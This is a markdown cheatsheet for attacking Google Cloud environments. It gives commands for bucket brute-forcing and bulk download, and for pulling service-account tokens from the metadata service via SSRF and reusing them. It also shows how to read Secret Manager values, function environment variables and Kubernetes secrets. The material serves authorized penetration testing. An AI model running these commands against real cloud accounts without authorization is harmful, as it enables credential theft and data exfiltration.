# ğŸ”´ GCP Pentesting Cheatsheet

```
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   
â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â•     â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘         â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
 â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•â•šâ•â•         â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   
```

---

## ğŸª£ Google Cloud Storage (GCS)

### Bucket Enumeration
```bash
# Check for public buckets
curl https://storage.googleapis.com/BUCKET_NAME

# List bucket contents (if public)
curl "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o"

# Using gsutil
gsutil ls gs://bucket-name
gsutil ls -la gs://bucket-name

# Download entire bucket
gsutil -m cp -r gs://bucket-name ./local-folder

# Brute force bucket names
ffuf -u "https://storage.googleapis.com/FUZZ" -w wordlist.txt -mc 200,403
```

### Common GCS Bucket Names
```
target-backup
target-dev
target-prod
target-data
target-assets
target-logs
target-uploads
```

### Check Bucket Permissions
```bash
# Get bucket IAM policy
gsutil iam get gs://bucket-name

# Test write access
gsutil cp test.txt gs://bucket-name/test.txt
```

---

## ğŸ”‘ IAM & Service Accounts

### With Valid Credentials
```bash
# Authenticate
gcloud auth activate-service-account --key-file=key.json
# or
gcloud auth login

# Get current identity
gcloud auth list
gcloud config get-value account

# List projects
gcloud projects list

# Set project
gcloud config set project PROJECT_ID

# List service accounts
gcloud iam service-accounts list

# Get service account keys
gcloud iam service-accounts keys list --iam-account=SA_EMAIL

# List roles
gcloud iam roles list --project PROJECT_ID

# Get IAM policy
gcloud projects get-iam-policy PROJECT_ID
```

### Service Account Key Enumeration
```bash
# List all service accounts
gcloud iam service-accounts list --project PROJECT_ID

# Check service account permissions
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --filter="bindings.members:serviceAccount:"
```

---

## ğŸ“„ GCP Metadata Service

### SSRF to Metadata
```bash
# Get instance metadata
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/

# Get access token
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Get service account email
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# Get all scopes
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"

# Useful metadata endpoints
/computeMetadata/v1/project/project-id
/computeMetadata/v1/project/numeric-project-id
/computeMetadata/v1/instance/hostname
/computeMetadata/v1/instance/zone
/computeMetadata/v1/instance/attributes/               # Custom attributes (may contain secrets!)
/computeMetadata/v1/instance/attributes/startup-script # Startup script
```

### Using Stolen Token
```bash
# Set access token
export ACCESS_TOKEN="ya29...."

# Use with gcloud
gcloud auth activate-refresh-token --quiet

# Use with curl
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://www.googleapis.com/compute/v1/projects/PROJECT_ID/zones/us-central1-a/instances"
```

---

## ğŸ–¥ï¸ Compute Engine

### Enumeration
```bash
# List instances
gcloud compute instances list

# Get instance details
gcloud compute instances describe INSTANCE_NAME --zone ZONE

# List disks
gcloud compute disks list

# List snapshots
gcloud compute snapshots list

# List images
gcloud compute images list --project PROJECT_ID

# Get firewall rules
gcloud compute firewall-rules list
gcloud compute firewall-rules describe RULE_NAME
```

### SSH Access
```bash
# SSH to instance (if allowed)
gcloud compute ssh INSTANCE_NAME --zone ZONE

# Generate SSH config
gcloud compute config-ssh
```

---

## âš¡ Cloud Functions

### Enumeration
```bash
# List functions
gcloud functions list

# Get function details
gcloud functions describe FUNCTION_NAME --region REGION

# Get function source (if accessible)
gcloud functions describe FUNCTION_NAME --region REGION --format="value(sourceArchiveUrl)"

# List environment variables (may contain secrets!)
gcloud functions describe FUNCTION_NAME --region REGION --format="value(environmentVariables)"
```

---

## ğŸ” Secret Manager

### Enumeration
```bash
# List secrets
gcloud secrets list

# Get secret value
gcloud secrets versions access latest --secret=SECRET_NAME

# List all versions
gcloud secrets versions list SECRET_NAME
```

---

## ğŸ—„ï¸ Other GCP Services

### Cloud SQL
```bash
# List instances
gcloud sql instances list

# Get instance details
gcloud sql instances describe INSTANCE_NAME

# List databases
gcloud sql databases list --instance=INSTANCE_NAME
```

### BigQuery
```bash
# List datasets
bq ls

# List tables
bq ls dataset_name

# Query data
bq query --use_legacy_sql=false 'SELECT * FROM dataset.table LIMIT 10'
```

### Kubernetes (GKE)
```bash
# List clusters
gcloud container clusters list

# Get credentials
gcloud container clusters get-credentials CLUSTER_NAME --zone ZONE

# Then use kubectl
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
```

---

## ğŸ› ï¸ GCP Pentesting Tools

### ScoutSuite
```bash
pip install scoutsuite
scout gcp --service-account key.json
```

### gcp_enum
```bash
# Comprehensive GCP enumeration
python3 gcp_enum.py -k key.json
```

### GCPBucketBrute
```bash
# Bucket enumeration
python3 gcpbucketbrute.py -k wordlist.txt -t target
```

---

## ğŸ“‹ GCP Pentesting Checklist

```markdown
â–¡ Enumerate GCS buckets (public/private)
â–¡ Check for exposed service account keys
â–¡ Enumerate IAM policies & permissions
â–¡ Check for IMDS exposure
â–¡ Enumerate Compute instances
â–¡ Check firewall rules
â–¡ Enumerate Cloud Functions for secrets
â–¡ Check Secret Manager
â–¡ Enumerate Cloud SQL / BigQuery
â–¡ Check GKE clusters
```

---

## ğŸ”— Related Cheatsheets

- [AWS Pentesting](./AWS-Pentesting.md)
- [Azure Pentesting](./Azure-Pentesting.md)
- [SSRF Attacks](../SSRF/README.md)

---

**Back to Overview:** [â˜ï¸ Cloud Security](./README.md)
